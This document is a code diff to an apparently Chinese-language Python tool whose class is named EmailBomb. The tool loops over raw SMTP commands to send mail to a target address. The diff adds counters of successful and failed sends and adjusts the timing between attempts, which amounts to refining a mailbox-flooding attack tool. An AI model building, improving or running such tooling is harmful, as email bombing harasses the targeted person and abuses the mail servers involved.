@@ -15,6 +15,7 @@ class EmailBomb:
         self.timeout = timeout
         self.SMTP_addrs = [SMTP_addr] if SMTP_addr else []  # 必须为列表
 
+        self.success_num = self.failed_num = 0
         self.exit_flag = 0  # 1：收到退出指令；0：未收到退出指令
         self.running = 1  # 0：退出；1：未退出
 
@@ -68,9 +69,11 @@ class EmailBomb:
                     code, msg = self.emailer.Send(u"ehlo antispam")
                     self.update_status(msg, code=code)
                     if not code:
+                        self.failed_num += 1
                         time.sleep(2)
                         continue
                 else:
+                    self.failed_num += 1
                     time.sleep(2)
 
                 time.sleep(random.random())
@@ -79,6 +82,7 @@ class EmailBomb:
                 code, msg = self.emailer.Send(u"mail from:<%s>" % self.from_addr)
                 self.update_status(msg, code=code)
                 if not code:
+                    self.failed_num += 1
                     time.sleep(2)
                     continue
 
@@ -90,6 +94,7 @@ class EmailBomb:
                 if code:
                     break
                 else:
+                    self.failed_num += 1
                     time.sleep(2)
 
             while not self.exit_flag:
@@ -100,6 +105,7 @@ class EmailBomb:
                 if code:
                     break
                 else:
+                    self.failed_num += 1
                     time.sleep(2)
 
             while not self.exit_flag:
@@ -108,6 +114,7 @@ class EmailBomb:
                 code, msg = self.emailer.Send(u"to: %s" % self.to_addr, recv=False)
                 self.update_status(msg, code=code)
                 if not code:
+                    self.failed_num += 1
                     time.sleep(2)
                     continue
 
@@ -116,6 +123,7 @@ class EmailBomb:
                 code, msg = self.emailer.Send(u"from: %s" % self.from_addr, recv=False)
                 self.update_status(msg, code=code)
                 if not code:
+                    self.failed_num += 1
                     time.sleep(2)
                     continue
 
@@ -124,6 +132,7 @@ class EmailBomb:
                 code, msg = self.emailer.Send("subject: "+subject+"\r\n", recv=False)
                 self.update_status(msg, code=code)
                 if not code:
+                    self.failed_num += 1
                     time.sleep(2)
                     continue
 
@@ -142,9 +151,12 @@ class EmailBomb:
                 )
 
                 self.update_status(msg, code=code)
-                time.sleep(2)
 
                 if not code:
+                    self.failed_num += 1
+                    time.sleep(2)
                     break
+                else:
+                    self.success_num += 1
 
         self.running = 0
